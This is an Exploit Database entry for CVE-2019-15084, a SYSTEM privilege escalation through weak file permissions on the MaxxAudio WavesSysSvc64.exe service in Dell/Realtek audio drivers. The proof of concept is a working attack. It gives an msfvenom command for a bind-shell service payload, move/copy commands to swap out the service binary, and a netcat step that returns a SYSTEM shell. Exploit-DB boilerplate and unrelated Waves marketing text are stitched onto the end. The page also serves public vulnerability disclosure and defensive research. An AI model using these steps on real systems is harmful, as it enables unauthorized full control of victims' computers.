# Exploit Title: MaxxAudio Drivers WavesSysSvc64.exe File Permissions SYSTEM Privilege Escalation
# Google Dork:
# Date: 2/18/2019
# Exploit Author: Mike Siegel @ml_siegel
# Vendor Homepage: https://maxx.com
# Software Link:
# Version: 1.6.2.0 (May affect other versions)
# Tested on: Win 10 64 bit
# CVE : CVE-2019-15084

MaxxAudio licenses their driver technology to OEMs and is commonly installed on Dell Laptops (and others) as part of other driver installations.

MaxxAudio drivers version 1.6.2.0 install with incorrect file permissions. As a result a local attacker can escalate to SYSTEM level privileges.

Dell PSIRT has acknowledged the issue and advises updating to a supported driver.

Proof of concept:

1. Validate incorrect permissions.

2. Create payload

Create a service payload in msfvenom, transfer to victim:

# msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe-service -o service.exe

3. Overwrite file.

The file will be in use, you cannot directly overwrite. However you can move the file and replace.

C:\Users\user> move "C:\Program Files\Waves\MaxxAudio\WavesSysSvc64.exe" "C:\Program Files\Waves\MaxxAudio\WavesSysSvc64.bak"
C:\Users\user> copy service.exe "C:\Program Files\Waves\MaxxAudio\WavesSysSvc64.exe"

4. Reboot the system.  Then use netcat or telnet to connect back to 127.0.0.1:4444

C:\WINDOWS\SYSTEM32>whoami
whoami
nt authority\system

Additional information:

This file is embedded in Realtek audio drivers. Dell has since removed this version from their site but it appears to have been released in January 2017.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Tuning

### Technology

Technologies designed by studio engineers bring out the fullness of music, movie and video soundtracks. With expertise in broadcast-quality sound, Waves makes conference calling clearer and more intelligible.

### Team

Across the many workgroups at Waves talented individuals come from diverse backgrounds in music and audio post-production. From GRAMMY Award®-winning music producers, to turntablists and sound designers.

### Tuning

Perfecting sound quality on consumer devices goes beyond technology, it’s about hands-on tuning. Just like producing and mixing a hit record, the Waves team of tuners turns the knobs, moves faders, and tweaks parameters under the hood to deliver full, satisfying sound.
